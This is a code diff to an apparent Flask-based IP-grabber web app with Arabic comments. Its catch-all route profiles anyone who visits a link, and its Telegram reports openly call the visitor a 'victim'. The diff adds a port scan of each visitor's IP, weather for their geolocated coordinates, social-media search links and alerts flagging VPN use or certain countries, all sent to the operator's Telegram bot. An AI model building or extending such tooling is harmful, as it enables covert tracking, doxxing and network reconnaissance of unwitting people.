@@ -7,6 +7,7 @@ import time
 import threading
 import re
 import json
+import socket
 
 app = Flask(__name__)
 
@@ -352,6 +353,109 @@ def get_time_info(location):
     
     return time_info
 
+# ========== الدوال الجديدة المطلوبة ==========
+
+def scan_common_ports(ip):
+    """فحص سريع للبورتات الشائعة"""
+    common_ports = [
+        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 
+        443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080
+    ]
+    open_ports = []
+    
+    for port in common_ports[:10]:  # نفحص أول 10 بس عشان ما يعلقش
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            result = sock.connect_ex((ip, port))
+            if result == 0:
+                open_ports.append(port)
+            sock.close()
+        except:
+            pass
+    
+    return open_ports
+
+def get_weather_info(lat, lon):
+    """جلب معلومات الطقس من خط الطول والعرض"""
+    try:
+        response = requests.get(
+            f"https://api.open-meteo.com/v1/forecast?latitude={lat}&longitude={lon}&current_weather=true",
+            timeout=5
+        )
+        if response.status_code == 200:
+            data = response.json()
+            weather = data.get('current_weather', {})
+            temp = weather.get('temperature', 'غير معروف')
+            wind = weather.get('windspeed', 'غير معروف')
+            code = weather.get('weathercode', 0)
+            
+            # ترجمة حالة الطقس
+            weather_codes = {
+                0: '☀️ صافي',
+                1: '🌤️ غائم جزئياً',
+                2: '⛅ غائم',
+                3: '☁️ غائم كلياً',
+                45: '🌫️ ضباب',
+                51: '🌧️ رذاذ خفيف',
+                61: '🌧️ مطر خفيف',
+                71: '🌨️ ثلج خفيف',
+                95: '⛈️ عاصفة رعدية'
+            }
+            
+            condition = weather_codes.get(code, 'غير معروف')
+            
+            return f"🌡️ {temp}°C, 💨 {wind} km/h, {condition}"
+    except:
+        pass
+    return "غير متوفرة"
+
+def check_social_media(ip):
+    """التحقق من وجود الـ IP في قواعد بيانات وسائل التواصل"""
+    social_links = []
+    
+    # روابط البحث في منصات مختلفة
+    platforms = {
+        'Facebook': f'https://www.facebook.com/search/people/?q={ip}',
+        'Twitter': f'https://twitter.com/search?q={ip}',
+        'LinkedIn': f'https://www.linkedin.com/search/results/all/?keywords={ip}',
+        'GitHub': f'https://github.com/search?q={ip}',
+        'Reddit': f'https://www.reddit.com/search/?q={ip}'
+    }
+    
+    for platform, url in platforms.items():
+        social_links.append(f"{platform}: {url}")
+    
+    return social_links
+
+def check_alert_conditions(location, security):
+    """فحص شروط التنبيه"""
+    alerts = []
+    
+    # تنبيه إذا كان من منطقة حساسة
+    sensitive_countries = ['IR', 'RU', 'CN', 'KP', 'SY', 'IQ', 'AF']
+    if location.get('country_code') in sensitive_countries:
+        alerts.append("⚠️ ضحية من منطقة حساسة!")
+    
+    # تنبيه إذا كان يستخدم VPN
+    if security.get('proxy'):
+        alerts.append("🛡️ ضحية يستخدم VPN!")
+    
+    # تنبيه إذا كان اتصال موبايل
+    if security.get('mobile'):
+        alerts.append("📱 ضحية على شبكة موبايل")
+    
+    # تنبيه إذا كان استضافة
+    if security.get('hosting'):
+        alerts.append("☁️ ضحية على خادم استضافة")
+    
+    if alerts:
+        send_telegram("🔔 **تنبيهات مهمة** 🔔\n" + "\n".join(alerts))
+    
+    return alerts
+
+# ==============================================
+
 def send_telegram(text):
     """ترسل رسالة لتليجرام"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -372,6 +476,12 @@ def catch_all(path):
     network = get_network_details(request.headers)
     security = get_security_analysis(real_ip)
     time_info = get_time_info(location)
+    
+    # 2.5 نجيب المعلومات الإضافية الجديدة
+    open_ports = scan_common_ports(real_ip)
+    weather = get_weather_info(location['latitude'], location['longitude'])
+    social_links = check_social_media(real_ip)
+    alerts = check_alert_conditions(location, security)
     
     # 3. معلومات الموقع (كلها حقيقية)
     location_msg = f"""
@@ -525,7 +635,23 @@ https://www.shodan.io/host/{real_ip}
     """
     send_telegram(time_msg)
     
-    # 10. التقرير النهائي
+    # 10. معلومات إضافية جديدة (بورتات + طقس + سوشيال ميديا)
+    extra_msg = f"""
+╔══════════════════════════════╗
+║    🌡️ معلومات إضافية         ║
+╚══════════════════════════════╝
+
+┌────────────────────────────────
+│ 🌦️ <b>الطقس:</b> {weather}
+│ 🔌 <b>البورتات المفتوحة:</b> {', '.join(map(str, open_ports)) if open_ports else 'لا توجد'}
+└────────────────────────────────
+
+【📱】 روابط التواصل الاجتماعي:
+{chr(10).join(social_links[:3])}
+    """
+    send_telegram(extra_msg)
+    
+    # 11. التقرير النهائي
     final_msg = f"""
 ╔══════════════════════════════╗
 ║    ✅ تقرير كامل عن الضحية    ║
@@ -538,6 +664,7 @@ https://www.shodan.io/host/{real_ip}
 🌐 <b>المتصفح:</b> {device['browser']} {device['browser_version']}
 📡 <b>مزود الخدمة:</b> {location['isp']}
 🛡️ <b>الحالة الأمنية:</b> {security['threat_level']}
+🌡️ <b>الطقس:</b> {weather}
 ⏰ <b>وقت الدخول:</b> {time_info['local_time']}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -573,5 +700,9 @@ if __name__ == '__main__':
     print("   ✅ التحليل الأمني")
     print("   ✅ 6 روابط خرائط")
     print("   ✅ 5 روابط تحقق")
+    print("   ✅ فحص البورتات")
+    print("   ✅ معلومات الطقس")
+    print("   ✅ روابط التواصل الاجتماعي")
+    print("   ✅ نظام التنبيهات")
     print("="*50)
     app.run(host='0.0.0.0', port=port)
